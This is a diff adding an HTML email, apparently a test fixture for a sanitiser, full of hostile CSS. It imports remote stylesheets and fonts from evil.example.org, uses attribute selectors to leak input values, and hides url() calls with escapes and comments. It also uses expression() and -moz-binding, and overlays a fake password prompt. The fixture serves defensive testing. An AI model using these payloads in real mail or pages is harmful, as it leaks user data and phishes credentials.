@@ -1,0 +1,31 @@
+From: Attacker <x@example.org>
+To: Alice <alice@example.org>
+Subject: CSS tricks
+Date: Fri, 5 Sep 2026 10:03:00 +0200
+Message-ID: <css-exfil@example.org>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<style>
+@import url("https://evil.example.org/s.css");
+@import 'https://evil.example.org/t.css';
+@font-face { font-family: leak; src: url(https://evil.example.org/f.woff); unicode-range: U+41; }
+input[value^="a"] { background: url(https://evil.example.org/a); }
+input[value^="b"] { background: url(https://evil.example.org/b); }
+p { color: red; font-family: Arial, sans-serif; }
+.overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; }
+.hidden { visibility: hidden; opacity: 0; }
+.exp { width: expression(alert(1)); }
+.esc { background: u\72 l(https://evil.example.org/e); }
+.cmt { background: u/**/rl(https://evil.example.org/c); }
+@media screen and (max-width: 600px) { p { font-size: 18px; } @font-face { font-family: n; src: url(https://evil.example.org/n.woff); } }
+@supports (display: grid) { p { display: grid; } }
+p::before { content: "Trusted sender: "; }
+</style>
+</head><body>
+<div class="overlay">Fake login, please enter your password</div>
+<p style="position: absolute; top: 0; left: 0; background: url(https://evil.example.org/p)">absolute</p>
+<p style="color: blue; behavior: url(x.htc); -moz-binding: url(https://evil.example.org/b.xml)">binding</p>
+<p style="font-size: 14px !important; margin: 0 auto">fine</p>
+</body></html>
